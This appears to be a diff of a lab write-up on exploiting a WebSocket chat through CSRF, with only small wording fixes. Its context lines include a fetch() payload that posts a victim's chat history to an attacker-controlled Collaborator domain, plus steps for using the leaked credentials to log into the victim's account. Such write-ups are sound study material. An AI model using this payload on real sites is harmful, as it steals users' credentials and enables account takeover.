@@ -6,7 +6,7 @@
 - **Date Solved:** 10/9/2026
 ## Vulnerability Summary
 
-The app has a live chat feature that is vulnerable to Cross-site Request Forgery (CSRF), exploited through WebSockets. The websocket command `READY` retrieves past chat message from the server . Combined with the server's sole session handling mechanism using HTTP cookies and the lack of anti-CSRF token, we can use XSS to perform CSRF, exfiltrating an user's sensitive data (in this case, credentials) to our external domain, allowing us to take control of their account.
+The app has a live chat feature that is vulnerable to Cross-site Request Forgery (CSRF), exploited through WebSockets. The WebSocket command `READY` retrieves past chat message from the server. Combined with the server's sole session handling mechanism using HTTP cookies and the lack of anti-CSRF token, we can use XSS to perform CSRF, exfiltrating an user's sensitive data (in this case, credentials) to our external domain, allowing us to take control of their account.
 ## Reconnaissance
 
 - Navigate to the live chat feature at `/chat` and send a normal message via the chat interface (`aaa`). In Burp Suite > Proxy > WebSockets history, the messages are transmitted as JSON objects:
@@ -35,7 +35,7 @@ fetch('https://burp-collaborator-domain', {method: 'POST', mode: 'no-cors', body
 };
 </script>
 ```
-4. Poll for interactions in your Burp Collaborator tab. You should see that the HTTP interactions contain the victim's chat history (not in chronological order). Read all of  the requests' body. We can infer that the victim forgot the password and asked the chatbot for it. In one of these request, the chatbot replies with the victim's credentials:
+4. Poll for interactions in your Burp Collaborator tab. You should see that the HTTP interactions contain the victim's chat history (not in chronological order). Read all of the requests' body. We can infer that the victim forgot the password and asked the chatbot for it. In one of these request, the chatbot replies with the victim's credentials:
 ![alt text](image-1.png)
 5. Use these credentials to log into `carlos`'s account. You should be able to do so successfully, and lab is solved.
 ## Payload Used
